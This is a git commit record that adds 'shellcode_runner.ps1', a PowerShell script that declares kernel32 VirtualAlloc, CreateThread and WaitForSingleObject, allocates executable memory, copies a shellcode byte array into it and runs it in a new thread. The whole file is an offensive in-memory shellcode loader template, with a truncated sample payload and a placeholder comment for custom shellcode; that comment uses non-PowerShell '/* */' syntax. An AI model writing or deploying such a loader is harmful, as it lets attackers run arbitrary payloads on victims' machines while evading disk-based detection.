3f0481b3ddf882a08526905ecf90d37e10d74d9f
战刃幽影 <reis_israel@hotmail.com>
2025-08-05 01:53:06 -0300

    Create shellcode_runner.ps1

---
+++ shellcode_runner.ps1
@@ -0,0 +1,31 @@
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type $Kernel32
+
+/* your custom shellcode... */
+
+[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52;
+
+$size = $buf.Length
+
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
